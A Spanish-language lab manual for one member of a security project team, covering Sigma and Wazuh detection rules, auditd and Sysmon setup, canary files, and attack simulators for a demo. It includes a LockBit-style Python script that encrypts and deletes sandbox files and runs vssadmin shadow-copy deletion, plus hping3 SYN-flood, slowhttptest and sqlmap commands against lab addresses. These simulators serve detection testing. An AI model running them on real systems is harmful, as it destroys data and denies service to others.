# Manual P3 — Angeles Castillo · Detección + Attack Simulation

| Campo | Valor |
|-------|-------|
| Rol | Owner de Layer 1 (Sigma + Wazuh), Layer 3 (Canary FIM) y todos los simuladores de ataque |
| Owns | `detection/sigma/` · `detection/wazuh/` · `deception/canary_fim/` · `attack-simulation/` |
| No owns | ML/LLM (P2) · SOAR/Notif (P1) · Infra (P4) |
| Outputs blocking | `events:raw_wazuh` (consumido por P2) · simuladores ejecutables (operados por P4 en demo) |
| Entrega final | **13 de junio de 2026** |

---

> **Conexión con el SOAR de P1 (ADR-0013 §3 · ver `_COORDINACION_INTERMEDIA.md`):** el SOAR de P1 ya está completo y testeado, y **solo consume**. Tus alertas de Sigma (`source_layer=layer_1`) y canary (`source_layer=layer_3`) van al stream Redis `events:normalized` como `NormalizedAlert` (contrato `argos_contracts/alert.py`: con `technique_mitre`, `severity_label`, `severity_score`, `host_id`). P1 **no normaliza** el crudo; vos publicás ya normalizado. Y definí los comandos Wazuh active-response que invoca `soar/playbooks/wazuh.py` (throttle, snapshot, isolation, kill). La mención a `events:raw_wazuh` de abajo es del diseño previo.

## 0. Tu charter

> Tú generas los eventos: tanto las **alertas** (Sigma rules que disparan sobre logs Wazuh, Canary FIM whodata) como los **ataques** que las disparan (ransomware simulator, DDoS con hping3/slowhttptest, SQL injection con sqlmap). Sin ti, las otras 3 capas no tienen nada que procesar.

### 0.1 UCs que cubres

| UC | Tu rol |
|----|--------|
| UC-01 LockBit-like | Sigma firing T1486 + ML score sobre tus eventos crudos |
| UC-02 Canary path | Layer 3 (Canary FIM whodata) — única capa firing |
| UC-04 Postgres attack | `postgres_attack.py` + Sigma reglas T1021 |
| UC-06 DDoS (hping3 + slowhttptest) | Simulador + Sigma red |
| UC-07 SELECT masivo (false positive) | Generador pgAudit + Sigma DB |
| UC-08 SQL injection (sqlmap) | Simulador + Sigma DB |

### 0.2 Cómo leer cada sub-sección

Cada componente sigue: **Contexto** → **Pasos manuales** si aplica → **Comandos** → **Salida esperada** → **Verificación** → **Si algo falla**.

---

# Fase 1 — Cimientos

## 1.1 Prerequisites

### Comandos

```bash
python3 --version
docker --version
sudo apt list --installed 2>/dev/null | grep -E "(hping3|slowhttptest|sqlmap)" || echo "ninguno instalado aún"
```

### Salida esperada

```text
Python 3.11.7
Docker version 24.x.x
ninguno instalado aún
```

---

## 1.2 Instalar simuladores de ataque

### Pasos manuales (Ubuntu/Debian)

1. Actualiza el índice de paquetes: `sudo apt update`.
2. Instala los 3 paquetes: hping3 (SYN flood), slowhttptest (slow HTTP), sqlmap (SQL injection).
3. Verifica cada uno con `--version`.

### Comandos

```bash
sudo apt update
sudo apt install -y hping3 slowhttptest sqlmap

hping3 --version 2>&1 | head -1
slowhttptest -v 2>&1 | head -1
sqlmap --version 2>&1 | head -1
```

### Salida esperada

```text
hping3 version 3.x
Version 1.x
1.x.x.x
```

### Verificación

```verify
command -v hping3 && command -v slowhttptest && command -v sqlmap && echo "todos instalados"
```

Esperado:

```text
/usr/sbin/hping3
/usr/bin/slowhttptest
/usr/bin/sqlmap
todos instalados
```

### Si algo falla

| Síntoma | Causa | Fix |
|---------|-------|-----|
| `Unable to locate package hping3` en macOS | macOS no tiene apt | `brew install hping nmap` (hping3 no está en brew; usa nping) |
| `slowhttptest` not found en Ubuntu antiguo | Repo viejo | `sudo apt install -y slowhttptest --reinstall` o compilar desde `https://github.com/shekyan/slowhttptest` |

---

## 1.3 Instalar sigma-cli

### Comandos

```bash
pip install sigma-cli pysigma pysigma-backend-wazuh
sigma --version
```

### Salida esperada

```text
SigmaConverter v0.10.x
```

### Verificación

```verify
sigma plugin list | grep -i wazuh
```

Esperado:

```text
pysigma-backend-wazuh    OK
```

---

## 1.4 Clone repo + venv

### Comandos

```bash
mkdir -p ~/code && cd ~/code
git clone git@github.com:EnzoOrdonez/argos.git
cd argos
python3 -m venv .venv
source .venv/bin/activate
pip install -e ./argos_contracts
pip install -r detection/requirements.txt
pip install -r attack-simulation/requirements.txt
pytest detection/ attack-simulation/ -q
```

### Salida esperada

```text
Successfully installed argos_contracts-1.1.0 ...
......  [100%]
6 passed in 0.10s
```

---

## 1.5 Acceder al lab (P4 lo provee)

### Pasos manuales

1. P4 te comparte el Vagrantfile y las claves SSH (o sólo te pide hacer `vagrant up` con el repo).
2. Verifica acceso a las 3 VMs.

### Comandos

```bash
cd lab/
vagrant ssh windows-victim   # PowerShell prompt en Windows VM
exit

vagrant ssh linux-victim     # ubuntu@linux-victim
exit

vagrant ssh lab-manager      # ubuntu@lab-manager
exit
```

### Verificación

```verify
cd lab && vagrant status | grep -E "running|poweroff"
```

Esperado:

```text
windows-victim            running (virtualbox)
linux-victim              running (virtualbox)
lab-manager               running (virtualbox)
```

---

## ✅ Checklist Fase 1

| # | Check | OK |
|---|-------|----|
| 1 | hping3 · slowhttptest · sqlmap presentes | ☐ |
| 2 | `sigma --version` responde | ☐ |
| 3 | Repo clonado, venv, deps instaladas | ☐ |
| 4 | Tests existentes pasan (6 passed) | ☐ |
| 5 | Las 3 VMs accesibles vía `vagrant ssh` | ☐ |

---

# Fase 2 — Skeletons funcionales

## 2.1 Sysmon en Windows victim (logs base para Sigma)

### Contexto

Sysmon enriquece los Event Logs de Windows con info crítica: process create, file write, network conn, registry mods. Sin Sysmon, Sigma para Windows es ciego.

### Pasos manuales (en la VM Windows, via `vagrant ssh windows-victim`)

1. Abre PowerShell como Administrador.
2. Descarga Sysmon de Microsoft Sysinternals.
3. Descarga la config sysmon-modular de Olaf Hartong (estándar de facto).
4. Instala con `Sysmon64.exe -i`.
5. Verifica que el servicio quedó corriendo.

### Comandos (PowerShell en la VM Windows)

```powershell
New-Item -ItemType Directory -Force -Path C:\tools

Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile C:\tools\Sysmon.zip
Expand-Archive C:\tools\Sysmon.zip -DestinationPath C:\tools\Sysmon -Force
Invoke-WebRequest -Uri https://raw.githubusercontent.com/olafhartong/sysmon-modular/master/sysmonconfig.xml -OutFile C:\tools\Sysmon\sysmonconfig.xml

cd C:\tools\Sysmon
.\Sysmon64.exe -i sysmonconfig.xml -accepteula

Get-Service Sysmon64
```

### Salida esperada

```text
System Monitor v14.x - System activity monitor
Sysmon installed.
SysmonDrv installed.
Starting SysmonDrv.
SysmonDrv started.
Starting Sysmon..
Sysmon started.

Status   Name               DisplayName
------   ----               -----------
Running  Sysmon64           Sysmon64
```

### Verificación

```powershell
# disparar evento
notepad.exe; Start-Sleep 1; Stop-Process -Name notepad -Force
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 1 | Format-List Id, TimeCreated, Message
```

Esperado:

```text
Id           : 1
TimeCreated  : ...
Message      : Process Create:  ...  Image: C:\Windows\System32\notepad.exe  ...
```

### Si algo falla

| Síntoma | Causa | Fix |
|---------|-------|-----|
| `Access is denied` al ejecutar `Sysmon64.exe -i` | PowerShell no es admin | Cierra y abre PowerShell con "Run as Administrator" |
| Servicio Sysmon64 stopped | Reboot resetea | `Start-Service Sysmon64` |
| No hay eventos en EventLog | Driver no cargado | `sc query SysmonDrv` debe mostrar RUNNING |

---

## 2.2 auditd en Linux victim

### Pasos manuales (via `vagrant ssh linux-victim`)

1. Instalar paquete: `sudo apt install -y auditd audispd-plugins`.
2. Escribir reglas en `/etc/audit/rules.d/argos.rules` con 4 entradas críticas.
3. Reiniciar auditd.
4. Verificar con `auditctl -l`.

### Comandos

```bash
sudo apt update && sudo apt install -y auditd audispd-plugins

sudo tee /etc/audit/rules.d/argos.rules > /dev/null << 'EOF'
# Process exec
-a always,exit -F arch=b64 -S execve -k argos_exec
# Writes en directorios sensibles
-w /var/lib/postgresql -p wa -k argos_pg
-w /etc/passwd -p wa -k argos_passwd
-w /opt/argos/canary -p wa -k argos_canary
EOF

sudo systemctl restart auditd
sudo auditctl -l
```

### Salida esperada

```text
-a always,exit -F arch=b64 -S execve -F key=argos_exec
-w /var/lib/postgresql -p wa -k argos_pg
-w /etc/passwd -p wa -k argos_passwd
-w /opt/argos/canary -p wa -k argos_canary
```

### Verificación

```verify
sudo touch /etc/passwd
sudo ausearch -k argos_passwd | tail -5
```

Esperado:

```text
time->Fri May 24 18:10:00 2026
type=PROCTITLE msg=audit(...): proctitle="touch /etc/passwd"
type=PATH msg=audit(...): name="/etc/passwd" ...
type=CWD msg=audit(...):  cwd="/home/ubuntu"
type=SYSCALL msg=audit(...): ... exe="/usr/bin/touch" key="argos_passwd"
```

---

## 2.3 Sigma rules — Layer 1

### Contexto

Cada regla Sigma es un YAML declarativo que sigma-cli convierte a query del backend de tu SIEM (en nuestro caso, formato Wazuh XML). Versionas YAML → reglas son revisables, portables a otros SIEMs.

### Estructura

```text
detection/sigma/rules/
├── ransomware/
│   ├── win_proc_create_vssadmin_delete.yml      ← T1490
│   ├── win_file_mass_encrypt.yml                ← T1486
│   └── lin_canary_write_unexpected_user.yml     ← T1486+T1083
├── network/
│   ├── ddos_syn_flood.yml                       ← T1498
│   └── slow_http_post.yml                       ← T1499
├── db/
│   ├── pg_select_massive_unusual_table.yml      ← T1213
│   └── pg_sqli_pattern.yml                      ← T1190
└── lateral/
    └── win_psexec_remote_admin.yml              ← T1021
```

### Ejemplo completo: `win_proc_create_vssadmin_delete.yml`

```yaml
title: VSS Admin Shadow Copy Deletion (Ransomware Indicator)
id: 7c2d9e80-1f0c-4a4c-9b1f-argos001
status: experimental
description: |
  Detects use of vssadmin.exe to delete volume shadow copies, a classic
  pre-encryption step in ransomware (T1490 Inhibit System Recovery).
author: ARGOS / Angeles Castillo
date: 2026/05/24
references:
  - https://attack.mitre.org/techniques/T1490/
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 1
    Image|endswith: '\vssadmin.exe'
    CommandLine|contains|all:
      - 'delete'
      - 'shadows'
  condition: selection
falsepositives:
  - Legitimate admin removing old shadow copies (manual; check user context).
level: critical
tags:
  - attack.impact
  - attack.t1490
```

### Ejemplo: `pg_select_massive_unusual_table.yml`

```yaml
title: Massive SELECT on Unusual Table (Possible Data Exfil or False Positive)
id: 1a3b5c7d-9e0f-4321-abcd-argos007
status: experimental
description: |
  pgAudit reporta un SELECT que retornó > 100k filas sobre una tabla que
  no figura en el patrón normal del usuario. UC-07 usa esto como caso de FP.
logsource:
  product: postgresql
  service: pgaudit
detection:
  selection:
    audit_class: 'READ'
    rows_returned|gte: 100000
  filter_known:
    relation:
      - 'reports.daily_summary'
      - 'analytics.weekly_kpis'
  condition: selection and not filter_known
falsepositives:
  - Ad-hoc analytics queries.
level: medium
tags:
  - attack.exfiltration
  - attack.t1213
```

### Comandos (validar + convertir)

```bash
sigma check detection/sigma/rules/ --recursive

sigma convert -t wazuh -p windows_audit \
  detection/sigma/rules/ransomware/win_proc_create_vssadmin_delete.yml
```

### Salida esperada

```text
Found 8 valid Sigma rules. 0 errors. 0 warnings.

<rule id="100001" level="12">
  <if_sid>61610</if_sid>
  <field name="win.eventdata.image" type="pcre2">\\vssadmin\.exe$</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)delete.*shadows|shadows.*delete</field>
  <description>VSS Admin Shadow Copy Deletion (Ransomware Indicator)</description>
  ...
</rule>
```

### Verificación

```verify
sigma check detection/sigma/rules/ --recursive 2>&1 | grep -E "errors|warnings"
ls detection/sigma/rules/*/*.yml | wc -l
```

Esperado:

```text
Found 8 valid Sigma rules. 0 errors. 0 warnings.
8
```

---

## 2.4 Canary FIM whodata (Layer 3)

### Contexto

Creas archivos canary en directorios trap. Wazuh FIM con módulo `whodata` captura el evento de modificación junto con el usuario y proceso que lo tocó. Cualquier escritura a un canary = compromiso confirmado (alto valor, bajo FP).

### Pasos manuales (en linux-victim)

1. Crear directorio `/opt/argos/canary` (necesita sudo).
2. Poblar con archivos señuelo de nombres tentadores (`finance_2026_Q1.xlsx`, `passwords_backup.txt`).
3. Configurar el agent Wazuh para FIM whodata sobre ese directorio.
4. Reiniciar el agent.

### Comandos (en linux-victim)

```bash
sudo mkdir -p /opt/argos/canary

sudo tee /opt/argos/canary/finance_2026_Q1.xlsx > /dev/null << 'EOF'
THIS IS A CANARY FILE - DO NOT MODIFY
ARGOS will trigger an alert on any write/modify event.
EOF

sudo tee /opt/argos/canary/passwords_backup.txt > /dev/null << 'EOF'
ARGOS canary file. Touching this is malicious.
EOF

sudo chmod 644 /opt/argos/canary/*
```

### Configurar agent Wazuh — editar `/var/ossec/etc/ossec.conf`

Agrega dentro del bloque `<syscheck>`:

```xml
<syscheck>
  <directories whodata="yes" report_changes="yes" check_all="yes" realtime="yes">/opt/argos/canary</directories>
  <skip_nfs>yes</skip_nfs>
  <frequency>30</frequency>
</syscheck>
```

### Comandos para reiniciar

```bash
sudo systemctl restart wazuh-agent
sudo grep -i whodata /var/ossec/logs/ossec.log | tail -5
```

### Salida esperada

```text
2026/05/24 18:30:01 wazuh-syscheckd: INFO: (6921): Whodata engine started.
```

### Verificación

```verify
echo "tampered" | sudo tee -a /opt/argos/canary/passwords_backup.txt
sleep 3
sudo tail -50 /var/ossec/logs/alerts/alerts.json | jq 'select(.rule.id|tonumber>=500)' | head -30
```

Esperado:

```text
{
  "rule": { "id": "554", "level": 7, "description": "File modified..." },
  "syscheck": {
    "path": "/opt/argos/canary/passwords_backup.txt",
    "audit": { "user_name": "root", "process_name": "/usr/bin/tee", ... }
  }
}
```

### Si algo falla

| Síntoma | Causa | Fix |
|---------|-------|-----|
| `Whodata engine couldn't initialize` | Kernel < 3.16 o auditd no instalado | `sudo apt install auditd` y reboot |
| No alerta tras modificar canary | `realtime` desactivado | Revisa que `<directories realtime="yes" whodata="yes">` esté en `ossec.conf` |

---

## 2.5 Attack simulator: ransomware (UC-01, UC-02, UC-04)

### Contexto

Tres variantes:

- `uc01`: encryption masiva + vssadmin shadow delete → 3 capas firing → T0.
- `uc02`: sólo toca canaries → Layer 3 sola firing → T0.
- `uc04`: postgres_attack (T1190 + lateral) → T2 con two-person rule.

**NO hace daño real**: trabaja en `/opt/argos/sandbox/`. Cifrados son reversibles con la key que imprime.

### `attack-simulation/ransomware_simulator/lockbit_like.py`

```python
"""Simulador estilo LockBit — variantes uc01 (cifra) y uc02 (toca canaries)."""

from __future__ import annotations
import argparse, time
from pathlib import Path
from cryptography.fernet import Fernet

SANDBOX = Path("/opt/argos/sandbox")
CANARY  = Path("/opt/argos/canary")


def _encrypt_files(target_dir: Path, n_files: int = 200) -> int:
    key = Fernet.generate_key()
    f = Fernet(key)
    print(f"[lockbit-like] generated key: {key.decode()}")
    count = 0
    for path in target_dir.rglob("*"):
        if not path.is_file() or path.suffix == ".argos_locked":
            continue
        if count >= n_files:
            break
        try:
            data = path.read_bytes()
            encrypted = f.encrypt(data)
            new_path = path.with_suffix(path.suffix + ".argos_locked")
            new_path.write_bytes(encrypted)
            path.unlink()
            count += 1
        except Exception as e:  # noqa: BLE001
            print(f"[!] {path}: {e}")
    return count


def variant_uc01(target_host: str) -> None:
    print(f"[uc01] encrypting up to 200 files in {SANDBOX}/")
    n = _encrypt_files(SANDBOX, n_files=200)
    print(f"[uc01] encrypted {n} files")
    print("[uc01] (simulated) vssadmin delete shadows /all /quiet")
    import subprocess
    subprocess.run([
        "powershell.exe", "-Command",
        "Start-Process -FilePath vssadmin -ArgumentList 'delete shadows /all /quiet' "
        "-NoNewWindow -Wait -ErrorAction SilentlyContinue"
    ], check=False)


def variant_uc02(target_host: str) -> None:
    print(f"[uc02] writing to canaries in {CANARY}/ (NOT encrypting)")
    for canary in CANARY.glob("*"):
        try:
            with canary.open("ab") as f:
                f.write(b"\nTAMPERED by uc02 sim at " + str(time.time()).encode())
            print(f"  touched {canary.name}")
        except Exception as e:
            print(f"  [!] {canary}: {e}")


def main() -> None:
    p = argparse.ArgumentParser()
    p.add_argument("--variant", choices=["uc01", "uc02"], required=True)
    p.add_argument("--target", required=True)
    args = p.parse_args()
    {"uc01": variant_uc01, "uc02": variant_uc02}[args.variant](args.target)


if __name__ == "__main__":
    main()
```

### Pasos manuales — poblar sandbox

1. Crear directorio en linux-victim: `sudo mkdir -p /opt/argos/sandbox`.
2. Poblar con 500 archivos de ~4 KB cada uno (datos aleatorios para realismo).

### Comandos

```bash
sudo mkdir -p /opt/argos/sandbox
cd /opt/argos/sandbox
for i in $(seq 1 500); do
  sudo dd if=/dev/urandom of=file_${i}.dat bs=1K count=4 status=none
done
ls /opt/argos/sandbox | wc -l
```

### Salida esperada

```text
500
```

### Verificación (dry-run uc02)

```verify
python attack-simulation/ransomware_simulator/lockbit_like.py --variant uc02 --target linux-victim
ls /opt/argos/sandbox | wc -l   # debe seguir siendo 500
```

Esperado:

```text
[uc02] writing to canaries in /opt/argos/canary/ (NOT encrypting)
  touched finance_2026_Q1.xlsx
  touched passwords_backup.txt
500
```

---

## 2.6 Attack simulator: DDoS (UC-06)

### Contexto

Dos ataques de denegación de servicio: SYN flood (capa 3) y Slow HTTP POST (capa 7). Disparan Sigma rules de red.

### Pasos manuales

1. Confirma que P4 tiene un puerto 80 abierto en linux-victim (puede ser un nginx default o un placeholder).
2. Corre cada simulador desde tu laptop atacante.

### Comandos

```bash
# SYN flood (~3 segundos; CTRL+C para parar)
sudo timeout 3 hping3 -S -p 80 --flood --rand-source 192.168.56.21

# Slow HTTP POST (~30s)
slowhttptest -c 1000 -B -g -o /tmp/slowhttp_uc06 \
             -i 10 -r 200 -s 8192 -t POST \
             -u http://192.168.56.21:80/upload -x 10 -p 3
```

### Salida esperada

```text
HPING 192.168.56.21 (eth0 192.168.56.21): S set, 40 headers + 0 data bytes
hping in flood mode, no replies will be shown
--- 192.168.56.21 hping statistic ---
250000 packets transmitted, 0 packets received, 100% packet loss

Test ended on ... s
slow HTTP test status on ... s:
...
service unavailable    YES
```

### Verificación

```verify
ssh lab-manager "sudo grep -E 'syn-flood|slowhttp' /var/ossec/logs/alerts/alerts.json | tail -3"
```

Esperado:

```text
{"rule":{"description":"SYN flood detected ...","level":10,...}}
{"rule":{"description":"Slow HTTP attack detected ...","level":9,...}}
```

### Si algo falla

| Síntoma | Causa | Fix |
|---------|-------|-----|
| `Operation not permitted` con hping3 | Falta sudo o capability | `sudo hping3 ...` |
| `slowhttptest: command not found` después de apt install | PATH | `which slowhttptest` debe ser `/usr/bin/...` |
| Sigma red no firing | Bridge no envía eventos de red | Coordina con P4: el bridge debe envolver TODOS los alerts |

---

## 2.7 Attack simulator: SQL injection (UC-08)

### Pasos manuales

1. Pídele a P4 que confirme la app web vulnerable (DVWA o equivalente) corriendo en linux-victim:80.
2. Corre sqlmap "modo gentil" para no romper la DB.

### Comandos

```bash
sqlmap -u "http://192.168.56.21/login.php?username=admin&password=admin" \
       --batch --level=2 --risk=2 --dbs
```

### Salida esperada

```text
[INFO] testing connection to the target URL
[INFO] the back-end DBMS is PostgreSQL
[INFO] fetching database names
available databases [4]:
[*] app_prod
[*] argos_audit
[*] postgres
[*] template1
```

### Verificación

```verify
ssh linux-victim "sudo tail -50 /var/log/postgresql/postgresql-15-main.log | grep -i pgaudit | head -3"
```

Esperado:

```text
LOG: AUDIT: SESSION,READ,SELECT,SELECT pg_database.datname FROM ...
```

---

## 2.8 Generador de carga benigna (UC-07 false positive)

### Contexto

UC-07 valida que ARGOS NO escala falsos positivos. Una analista corre un SELECT que devuelve 200k filas: ruidoso pero legítimo. Debe terminar en T3 (sólo logging).

### `attack-simulation/benign_load/heavy_select.py`

```python
"""Carga benigna: SELECT masivo sobre tabla legítima."""

import argparse, time
import psycopg


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--rows", type=int, default=200_000)
    p.add_argument("--user", default="analyst")
    p.add_argument("--password", default="analyst_pwd")
    args = p.parse_args()

    conn = psycopg.connect(
        f"host=192.168.56.21 port=5432 dbname=app_prod "
        f"user={args.user} password={args.password}"
    )
    with conn.cursor() as cur:
        t0 = time.monotonic()
        cur.execute(f"SELECT generate_series(1, {args.rows}) AS n;")
        rows = cur.fetchall()
        dt = time.monotonic() - t0
        print(f"fetched {len(rows)} rows in {dt:.2f}s as user={args.user}")
    conn.close()


if __name__ == "__main__":
    main()
```

### Verificación

```verify
python attack-simulation/benign_load/heavy_select.py --rows 200000
sleep 5
redis-cli KEYS 'incident:*' | tail -1 | xargs redis-cli GET | jq '.tier'
```

Esperado:

```text
fetched 200000 rows in 1.34s as user=analyst
"T3"
```

Si el tier es T0/T1/T2 → tu sistema escala FPs y P1 debe revisar el `tier_router`.

---

## ✅ Checklist Fase 2

| # | Check | OK |
|---|-------|----|
| 1 | Sysmon corriendo en windows-victim | ☐ |
| 2 | auditd reglas cargadas en linux-victim | ☐ |
| 3 | Wazuh agent + FIM whodata activo | ☐ |
| 4 | ≥ 8 Sigma rules validan con `sigma check` | ☐ |
| 5 | Canary modificación dispara alerta con `user_name` y `process_name` | ☐ |
| 6 | uc01 cifra ≤ 200 archivos; uc02 toca canaries sin cifrar | ☐ |
| 7 | hping3 + slowhttptest producen alertas | ☐ |
| 8 | sqlmap detecta SQLi + pgAudit registra | ☐ |
| 9 | Generador benigno termina en T3 (no escala) | ☐ |

---

# Fase 3 — Integración real

## 3.1 Cargar Sigma rules en el Wazuh manager

### Pasos manuales

1. Generar reglas Wazuh-formateadas desde Sigma con `sigma convert`.
2. Copiarlas a `/var/ossec/etc/rules/` del manager.
3. Recargar manager.

### Comandos

```bash
mkdir -p /tmp/wazuh_rules
sigma convert -t wazuh -p windows_audit \
  --output /tmp/wazuh_rules/100_argos_ransomware.xml \
  detection/sigma/rules/ransomware/

vagrant scp /tmp/wazuh_rules/100_argos_ransomware.xml lab-manager:/var/ossec/etc/rules/

vagrant ssh lab-manager -c "sudo /var/ossec/bin/wazuh-control reload"
```

### Salida esperada

```text
Wrote 3 rules to /tmp/wazuh_rules/100_argos_ransomware.xml
100_argos_ransomware.xml                                  100%   2KB   1.5MB/s
Reloading.
Wazuh manager reloaded.
```

### Verificación

```verify
vagrant ssh linux-victim -c "echo 'tampered' | sudo tee -a /opt/argos/canary/passwords_backup.txt"
sleep 3
vagrant ssh lab-manager -c "sudo tail -5 /var/ossec/logs/alerts/alerts.json | jq -r '.rule.description'"
```

Esperado:

```text
Integrity checksum changed.
```

---

## 3.2 Bridge Wazuh → `events:raw_wazuh`

### Contexto

P4 levanta un servicio que tail-ea `alerts.json` y empuja al stream. Tu validación: ver que cada alerta significativa llega al stream.

### Verificación

```verify
redis-cli XLEN events:raw_wazuh
redis-cli XREVRANGE events:raw_wazuh + - COUNT 1
```

Esperado (después de disparar un canary):

```text
1
1) 1) "1234-0"
   2) 1) "data"
      2) "{\"host\":\"linux-victim\",\"mitre_technique\":\"T1486\",...}"
```

---

## 3.3 UC-01 end-to-end (con P1, P2 y P4 arriba)

### Comandos

```bash
vagrant ssh linux-victim
python /vagrant/attack-simulation/ransomware_simulator/lockbit_like.py \
       --variant uc01 --target linux-victim
```

### Verificación

```verify
sleep 10
redis-cli KEYS 'incident:*' | tail -1 | xargs redis-cli GET | jq '.tier, .num_layers_fired'
```

Esperado:

```text
"T0"
3
```

---

## ✅ Checklist Fase 3

| # | Check | OK |
|---|-------|----|
| 1 | Reglas Sigma cargadas en Wazuh manager | ☐ |
| 2 | Bridge alerts.json → events:raw_wazuh funcional | ☐ |
| 3 | UC-01 end-to-end OK | ☐ |
| 4 | UC-02 end-to-end OK | ☐ |
| 5 | UC-06 DDoS dispara alertas red | ☐ |
| 6 | UC-08 SQLi dispara alertas DB | ☐ |
| 7 | UC-07 benigno NO escala (queda T3) | ☐ |

---

# Fase 4 — Rehearsal y polish

## 4.1 Rehearsal serial de los 7 UCs

### Pasos manuales

1. Coordina ventana de 30 min con P1 + P4 arriba.
2. Ejecuta cada UC y mide latencia hasta incident creado.
3. Anota cada métrica en tabla.

### Comandos

```bash
for uc in uc01 uc02; do
  echo "=== $uc ==="
  vagrant ssh linux-victim -c "python /vagrant/attack-simulation/ransomware_simulator/lockbit_like.py --variant $uc --target linux-victim"
  sleep 30
done

sudo timeout 5 hping3 -S -p 80 --flood --rand-source 192.168.56.21
sleep 30

sqlmap -u "http://192.168.56.21/login.php?username=admin" --batch --level=2 --risk=2 --dbs >/dev/null
sleep 30

python attack-simulation/benign_load/heavy_select.py --rows 200000
```

### Métricas esperadas

| UC | Latency detect → incident | Tier | Capas firing | Notif OK |
|----|:-:|:-:|:-:|:-:|
| UC-01 | < 8 s | T0 | 3 | sí |
| UC-02 | < 6 s | T0 | 1 | sí |
| UC-04 | < 10 s | T2 | 2 | sí |
| UC-06 | < 12 s | T1 | 2 | sí |
| UC-07 | n/a | T3 | 1 | no (diseño) |
| UC-08 | < 15 s | T1 | 2 | sí |

---

## 4.2 Plan de fallback de ataques

### Contexto

Si un simulador falla el día del demo:

- **UC-01 fallback**: tener carpeta `/opt/argos/sandbox_pre_encrypted/` con archivos ya cifrados; demostrar mostrando ese estado y ejecutando sólo el `vssadmin` para disparar Sigma.
- **UC-06 fallback**: tener captura de Wireshark pre-grabada del flood.
- **Video respaldo**: P4 lo graba durante rehearsal final.

---

## 4.3 Pre-demo checklist (T-2 h)

| # | Check | OK |
|---|-------|----|
| 1 | `Get-Service Sysmon64` → Running | ☐ |
| 2 | `systemctl status auditd` → active | ☐ |
| 3 | Wazuh agent en ambas VMs running | ☐ |
| 4 | hping3 · slowhttptest · sqlmap responden a `--version` | ☐ |
| 5 | Canaries existen y son escribibles | ☐ |
| 6 | Sandbox tiene 500+ archivos (re-poblar si demo previo cifró) | ☐ |
| 7 | Video respaldo grabado | ☐ |

---

# Apéndice A — Troubleshooting

| # | Síntoma | Diagnóstico | Fix |
|---|---------|-------------|-----|
| A.1 | Sigma rule no dispara | ¿Carga? ¿Decode? ¿Sysmon? | `/var/ossec/bin/wazuh-logtest` y pegar el log |
| A.2 | Whodata no funciona | Kernel < 3.16 | Usar `realtime="yes"` sin whodata; perdemos atribución de usuario |
| A.3 | hping3 `Operation not permitted` | Sin capability | `sudo hping3 ...` o en contenedor `--cap-add=NET_RAW` |
| A.4 | sqlmap "no parameter found" | URL mal formada | Usa `--forms` para crawling de HTML |
| A.5 | Sandbox vacío post-demo | Sim cifró todo | `sudo bash /vagrant/attack-simulation/setup_sandbox.sh` |
| A.6 | Wazuh manager no recarga reglas | `reload` falla en silencio | `sudo /var/ossec/bin/wazuh-control restart` (drástico pero confiable) |

---

# Apéndice B — Comandos de emergencia

```bash
# Reset canaries
sudo cp /opt/argos/canary.template/* /opt/argos/canary/

# Re-poblar sandbox
sudo bash /vagrant/attack-simulation/setup_sandbox.sh

# Forzar re-emit del último alert al stream
sudo /var/ossec/bin/wazuh-logtest <<< "$(sudo tail -1 /var/ossec/logs/alerts/alerts.json | jq -r '.full_log')"

# Limpiar stream eventos crudos
redis-cli DEL events:raw_wazuh
redis-cli XGROUP CREATE events:raw_wazuh ml-pipeline 0 MKSTREAM
```

---

# Apéndice C — Referencias cruzadas

| Cuando estés en... | Lee |
|--------------------|-----|
| `detection/sigma/` | SAD §6.1, `docs/use-cases/USE_CASES.md` |
| `deception/canary_fim/` | SAD §6.4 |
| `attack-simulation/` | USE_CASES UC-01..UC-08, ADR-0008 |
| Hardening en defensa | THREAT_MODEL §3 |

---

## Change log

| Versión | Fecha | Cambio |
|---------|-------|--------|
| 3.0 | 2026-05-24 | Reestructurado: Contexto → Pasos manuales → Comandos → Salida → Verificación → Si algo falla. Bloques bash/powershell listos para copy buttons. Sin referencias temporales. Renombrado de `sprint-week-1-p3-angeles.md`. |
